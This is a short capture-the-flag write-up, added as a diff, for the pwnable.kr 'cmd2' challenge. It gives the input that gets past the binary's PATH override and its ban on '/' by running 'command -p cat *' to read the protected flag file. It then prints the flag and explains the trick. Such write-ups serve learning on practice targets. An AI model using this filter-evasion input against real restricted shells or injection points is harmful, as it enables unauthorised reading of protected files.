@@ -1,0 +1,15 @@
+cmd2 - pwnable.kr
+
+./cmd2 "command -p cat *"
+or
+./cmd2 "command -p cat * | command -p tail -n 1"
+
+
+flag: Shell_variables_can_be_quite_fun_to_play_with!
+
+
+
+in cmd2, path variable gets overridden so we can't use 'cat', but in addition to that we can't use '/', so we can't specify the full
+path - /bin/cat. so I googled and found that about the command -p, which looks in a secure predefined path that does usually points
+to the /bin directory, that way the cat command will work and of course we using the * cause we can't use flag, so we printing the 
+whole directory.
